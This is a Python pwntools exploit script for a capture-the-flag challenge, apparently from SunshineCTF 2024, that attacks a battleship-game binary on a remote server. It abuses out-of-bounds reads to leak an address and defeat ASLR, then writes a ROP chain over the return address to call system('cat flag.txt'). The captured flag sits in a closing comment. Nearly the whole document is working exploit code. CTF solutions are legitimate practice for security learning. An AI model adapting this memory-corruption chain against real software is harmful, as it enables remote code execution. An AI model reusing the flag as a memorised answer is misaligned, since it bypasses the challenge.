#!/usr/bin/env python3

from pwn import *

# note: this exploit needs to be run a few times on the remote

#context.log_level = "debug"
elf = ELF("./ship.bin", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("2024.sunshinectf.games", 24003)

def read8(where):
    what = 0
    for i in range(8):
        p.sendlineafter(b"Enter the row (0-9, a-f) >>> ", str(0).encode())
        p.sendlineafter(b"Enter the column (0-9, a-f) >>> ", str(where + i).encode())
        p.sendlineafter(b"Custom (C) >>> ", b"A")
        p.readuntil(b"Fired outside board, corrupting")
        what |= int(p.readline().decode().split(" ")[3], 16) << (8 * i)
    return what

def writeN(where, what):
    for i in range(len(what)):
        p.sendlineafter(b"Enter the row (0-9, a-f) >>> ", str(0).encode())
        p.sendlineafter(b"Enter the column (0-9, a-f) >>> ", str(where + i).encode())
        p.sendlineafter(b"Custom (C) >>> ", p8(what[i]))
        p.readuntil(b"Fired outside board, corrupting")

leak = read8(-24)
base = leak - 0x15e3
log.success(f"base: {hex(base)}") # bypass aslr

RET_ADDR_OFFSET = 0x218
POP_RDI = 0x1754 + base
CAT_FLAG_DOT_TXT = 0x2a1c + base
CALL_SYSTEM = 0x1760 + base

payload = b""
payload += p64(POP_RDI)
payload += p64(CAT_FLAG_DOT_TXT)
payload += p64(CALL_SYSTEM)
writeN(RET_ADDR_OFFSET, payload) # system("cat flag.txt")

KEEP_GOING_OFFSET = 0x20c
writeN(KEEP_GOING_OFFSET, p8(1)) # end the game early
p.readuntil(b"!")

p.interactive() # sun{v1ct0RY_on_Th3_High_s34}
